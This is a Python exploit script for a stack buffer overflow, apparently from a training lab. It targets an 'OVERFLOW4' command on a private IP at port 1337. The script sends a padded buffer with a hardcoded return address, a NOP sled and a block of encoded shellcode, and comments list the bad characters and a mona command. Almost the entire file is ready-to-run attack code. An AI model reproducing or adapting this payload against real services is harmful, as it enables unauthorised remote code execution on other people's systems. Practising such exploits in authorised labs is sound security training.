import socket

ip = "10.10.57.114"
port = 1337

prefix = "OVERFLOW4 "
offset = 2026 #2026
overflow = "A" * offset
retn = "\xaf\x11\x50\x62" # 625011af
#retn = "BBBB" # 62501203
#padding = ""
padding = "\x90" * 16

payload = ("\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x7a\x71\x81\x27\x83\xee\xfc\xe2\xf4\x86\x99\x03\x27\x7a\x71"
"\xe1\xae\x9f\x40\x41\x43\xf1\x21\xb1\xac\x28\x7d\x0a\x75\x6e"
"\xfa\xf3\x0f\x75\xc6\xcb\x01\x4b\x8e\x2d\x1b\x1b\x0d\x83\x0b"
"\x5a\xb0\x4e\x2a\x7b\xb6\x63\xd5\x28\x26\x0a\x75\x6a\xfa\xcb"
"\x1b\xf1\x3d\x90\x5f\x99\x39\x80\xf6\x2b\xfa\xd8\x07\x7b\xa2"
"\x0a\x6e\x62\x92\xbb\x6e\xf1\x45\x0a\x26\xac\x40\x7e\x8b\xbb"
"\xbe\x8c\x26\xbd\x49\x61\x52\x8c\x72\xfc\xdf\x41\x0c\xa5\x52"
"\x9e\x29\x0a\x7f\x5e\x70\x52\x41\xf1\x7d\xca\xac\x22\x6d\x80"
"\xf4\xf1\x75\x0a\x26\xaa\xf8\xc5\x03\x5e\x2a\xda\x46\x23\x2b"
"\xd0\xd8\x9a\x2e\xde\x7d\xf1\x63\x6a\xaa\x27\x19\xb2\x15\x7a"
"\x71\xe9\x50\x09\x43\xde\x73\x12\x3d\xf6\x01\x7d\x8e\x54\x9f"
"\xea\x70\x81\x27\x53\xb5\xd5\x77\x12\x58\x01\x4c\x7a\x8e\x54"
"\x77\x2a\x21\xd1\x67\x2a\x31\xd1\x4f\x90\x7e\x5e\xc7\x85\xa4"
"\x16\x4d\x7f\x19\x8b\x2e\xd3\x70\xe9\x25\x7a\x60\xdd\xae\x9c"
"\x1b\x91\x71\x2d\x19\x18\x82\x0e\x10\x7e\xf2\xff\xb1\xf5\x2b"
"\x85\x3f\x89\x52\x96\x19\x71\x92\xd8\x27\x7e\xf2\x12\x12\xec"
"\x43\x7a\xf8\x62\x70\x2d\x26\xb0\xd1\x10\x63\xd8\x71\x98\x8c"
"\xe7\xe0\x3e\x55\xbd\x26\x7b\xfc\xc5\x03\x6a\xb7\x81\x63\x2e"
"\x21\xd7\x71\x2c\x37\xd7\x69\x2c\x27\xd2\x71\x12\x08\x4d\x18"
"\xfc\x8e\x54\xae\x9a\x3f\xd7\x61\x85\x41\xe9\x2f\xfd\x6c\xe1"
"\xd8\xaf\xca\x61\x3a\x50\x7b\xe9\x81\xef\xcc\x1c\xd8\xaf\x4d"
"\x87\x5b\x70\xf1\x7a\xc7\x0f\x74\x3a\x60\x69\x03\xee\x4d\x7a"
"\x22\x7e\xf2")

##bad char 00 a9 aa cd ce d4 d5

##      !mona bytearray -b "\x00\xa9\xcd\xd4"
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
